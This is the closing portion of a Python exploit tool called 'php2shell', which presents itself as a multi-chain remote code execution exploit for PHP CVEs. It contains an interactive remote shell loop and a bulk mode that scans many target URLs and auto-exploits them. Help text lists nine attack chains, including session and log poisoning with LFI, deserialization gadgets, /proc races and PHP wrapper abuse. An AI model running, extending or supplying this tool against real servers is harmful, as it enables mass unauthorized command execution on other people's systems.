    fn = exploit_race if args.race else exploit
    while True:
        try:
            cmd = input("\033[91mphp2shell\033[0m> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd or cmd.lower() in ("exit", "quit"):
            break

        kwargs = dict(
            base_url=args.target, cmd=cmd, session_path=session_path,
            inject_ep=inject_ep, lfi_url=lfi["url"], lfi_param=lfi["param"],
            proxy=args.proxy,
        )
        if args.race:
            kwargs.update(threads=args.threads, attempts=args.attempts)

        output = fn(**kwargs)
        print(output.strip() if output and output.strip() else "(no output)")
        print()


def cmd_bulk(args):
    """Bulk scan mode: reads URLs from file, outputs JSONL verdicts."""
    with open(args.targets) as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    log.info(f"[*] Bulk scan: {len(targets)} targets from {args.targets}")
    out_file = args.output or args.targets + ".results.jsonl"

    for i, target in enumerate(targets):
        target = target.rstrip("/")
        log.info(f"\n[{i + 1}/{len(targets)}] {target}")
        verdict = {
            "target": target, "timestamp": datetime.now(timezone.utc).isoformat(),
            "status": "unknown", "session_fixation": None,
            "reachable": False, "lfi_count": 0, "chain": None,
        }

        try:
            info = recon(target, args.proxy)
            verdict["reachable"] = info["reachable"]
            if not info["reachable"]:
                verdict["status"] = "unreachable"
                _write_jsonl(out_file, verdict)
                continue

            fixation = check_session_fixation(target, args.proxy)
            verdict["session_fixation"] = fixation

            lfi_results = scan_lfi(target, args.proxy, target_os=info["os"],
                                   threads=args.scan_threads)
            verdict["lfi_count"] = len(lfi_results)

            if lfi_results:
                verdict["status"] = "armed"
            elif fixation:
                verdict["status"] = "session_fixation"
            else:
                verdict["status"] = "no_vector"

            if args.cmd and args.cmd != "id":
                result = auto_exploit(target, args.cmd, proxy=args.proxy,
                                      race=args.race, threads=args.threads,
                                      attempts=args.attempts)
                if result:
                    verdict["status"] = "rce_hit"
                    verdict["chain"] = result.get("chain")
                    verdict["output"] = result.get("output", "")[:200]
                else:
                    if verdict["status"] == "armed":
                        verdict["status"] = "armed_no_rce"

        except Exception as e:
            verdict["status"] = "error"
            verdict["error"] = str(e)[:200]

        _write_jsonl(out_file, verdict)

    log.info(f"\n[*] Results written to {out_file}")


def _write_jsonl(path, obj):
    with open(path, "a") as f:
        f.write(json.dumps(obj) + "\n")


# ── Entry Point ──────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="php2shell — CVE-2026-109618/109619 PHP RCE Exploit (9-chain)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
chains:
  1 — Session Poisoning + LFI (classic, most reliable with LFI)
  2 — Deserialization Gadgets (no LFI, needs framework with gadget class)
  3 — /proc/self/fd Race (no session, needs /proc + LFI)
  4 — phpinfo() Temp File Leak (needs phpinfo page + LFI)
  5 — Log Poisoning (needs readable log + LFI)
  6 — PEARCMD.php (Docker, register_argc_argv=On + LFI)
  7 — /proc/self/environ (Linux, needs /proc + LFI)
  8 — PHP Wrappers (needs allow_url_include + LFI)
  9 — UAF Disturbance Race (concurrent destroy/regen/gc during upload)

examples:
  %(prog)s -t http://target -c "id"                       # auto: all chains
  %(prog)s -t http://target --chain 2 -c "id"             # deser only
  %(prog)s -t http://target --shell                        # auto + shell
  %(prog)s -t http://target --scan                         # scan only
  %(prog)s -t http://target --check                        # recon + fixation
  %(prog)s -t http://target --chain 9 -c "id"              # UAF disturbance
  %(prog)s -t http://target --race -c "id"                 # race condition
  %(prog)s --targets urls.txt -c "id" -o results.jsonl     # bulk scan
  %(prog)s -t http://target -c "id" --proxy http://127.0.0.1:8080
  %(prog)s -t http://localhost:8080 -c "id" \\
    --inject-endpoint /upload.php --lfi-endpoint /view.php  # manual
        """,
    )

    p.add_argument("-t", "--target", help="Target base URL (required except with --targets)")
    p.add_argument("-c", "--cmd", default="id", help="Command to execute (default: id)")

    mode = p.add_mutually_exclusive_group()
    mode.add_argument("--shell", action="store_true",
                      help="Interactive shell (auto-discovers LFI)")
    mode.add_argument("--check", action="store_true", help="Recon only")
    mode.add_argument("--scan", action="store_true",
                      help="Scan for LFI + upload endpoints only")
    mode.add_argument("--targets", metavar="FILE",
                      help="Bulk scan: file with one URL per line (JSONL output)")

    p.add_argument("--chain", metavar="N",
                   help="Force specific chain (1-9 or 'all', default: all)")
    p.add_argument("--cmds", nargs="+", metavar="CMD",
                   help="Batch: multiple commands")
    p.add_argument("--cmd-file", metavar="FILE",
                   help="Batch: commands from file")

    manual = p.add_argument_group("manual mode (skip auto-discovery)")
    manual.add_argument("--inject-endpoint",
                        help="Multipart POST endpoint path")
    manual.add_argument("--lfi-endpoint",
                        help="LFI endpoint path (e.g., /view.php?file=)")
    manual.add_argument("--session-path", default="/var/lib/php/sessions",
                        help="Session save path")

    race_g = p.add_argument_group("race condition (cleanup=On)")
    race_g.add_argument("--race", action="store_true", help="Race mode")
    race_g.add_argument("--threads", type=int, default=15,
                        help="Threads (default: 15)")
    race_g.add_argument("--attempts", type=int, default=200,
                        help="Attempts (default: 200)")

    net = p.add_argument_group("network")
    net.add_argument("--proxy", metavar="URL",
                     help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    net.add_argument("--scan-threads", type=int, default=25,
                     help="LFI scan threads (default: 25)")

    out = p.add_argument_group("output")
    out.add_argument("-o", "--output", metavar="FILE",
                     help="Save output to file")
    out.add_argument("--json", action="store_true", help="JSON output")
    out.add_argument("-v", "--verbose", action="store_true")
    out.add_argument("-q", "--quiet", action="store_true")

    args = p.parse_args()

    if not args.target and not args.targets:
        p.error("one of -t/--target or --targets is required")
    if args.target:
        args.target = args.target.rstrip("/")

    _setup_log(args.verbose, args.quiet)

    if not args.quiet:
        print(BANNER)

    if args.check:
        cmd_check(args)
    elif args.scan:
        cmd_scan(args)
    elif args.targets:
        cmd_bulk(args)
    elif args.shell:
        cmd_shell(args)
    elif args.inject_endpoint and args.lfi_endpoint:
        cmd_manual(args)
    else:
        cmd_auto(args)


if __name__ == "__main__":
    main()
